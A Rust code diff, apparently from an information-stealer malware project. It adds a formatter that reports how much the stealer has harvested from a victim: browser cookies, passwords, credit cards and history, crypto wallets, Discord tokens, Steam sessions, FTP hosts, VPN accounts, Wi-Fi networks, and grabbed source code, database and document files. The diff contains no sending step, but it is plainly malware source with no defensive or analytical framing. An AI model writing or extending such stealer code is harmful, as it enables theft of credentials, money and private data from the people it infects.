@@ -1,6 +1,10 @@
 #![no_std]
 
 extern crate alloc;
+
+use core::fmt::{Display, Formatter};
+use indoc::indoc;
+
 pub mod atomic;
 
 macro_rules! increase_count {
@@ -77,4 +81,87 @@ pub trait Collector: Send + Sync
     fn vpn(&self) -> &Self::Vpn;
 
     fn device(&self) -> &Self::Device;
+}
+
+pub struct DisplayCollector<T: Collector>(pub T);
+
+impl<T: Collector> Display for DisplayCollector<T> {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        write!(
+            f,
+            indoc! {"
+                ▶ Browser:
+                  ├─ Cookies: {}
+                  ├─ Passwords: {}
+                  ├─ Credit cards: {}
+                  ├─ Auto fills: {}
+                  ├─ History: {}
+                  ├─ Bookmarks: {}
+                  └─ Downloads: {}
+            "},
+            self.0.browser().get_cookies(),
+            self.0.browser().get_passwords(),
+            self.0.browser().get_credit_cards(),
+            self.0.browser().get_auto_fills(),
+            self.0.browser().get_history(),
+            self.0.browser().get_bookmarks(),
+            self.0.browser().get_downloads(),
+        )?;
+
+        writeln!(f)?;
+
+        write!(
+            f,
+            indoc! {"
+                ▶ Software:
+                  ├─ Wallets: {}
+                  ├─ Ftp hosts: {}
+                  ├─ Telegram: {}
+                  ├─ Discord tokens: {}
+                  └─ Steam sessions: {}
+            "},
+            self.0.software().get_wallets(),
+            self.0.software().get_ftp_hosts(),
+            self.0.software().is_telegram(),
+            self.0.software().get_discord_tokens(),
+            self.0.software().get_steam_session(),
+        )?;
+
+        writeln!(f)?;
+
+        write!(
+            f,
+            indoc! {"
+                ▶ Files:
+                  ├─ Source code: {}
+                  ├─ Database: {}
+                  └─ Documents: {}
+            "},
+            self.0.file_grabber().get_source_code_files(),
+            self.0.file_grabber().get_database_files(),
+            self.0.file_grabber().get_documents(),
+        )?;
+
+        writeln!(f)?;
+
+        write!(
+            f,
+            indoc! {"
+                ▶ Vpn:
+                  └─ Accounts: {}
+            "},
+            self.0.vpn().get_accounts(),
+        )?;
+
+        writeln!(f)?;
+
+        write!(
+            f,
+            indoc! {"
+                ▶ Device:
+                  └─ Wifi networks: {}
+            "},
+            self.0.device().get_wifi_networks(),
+        )
+    }
 }
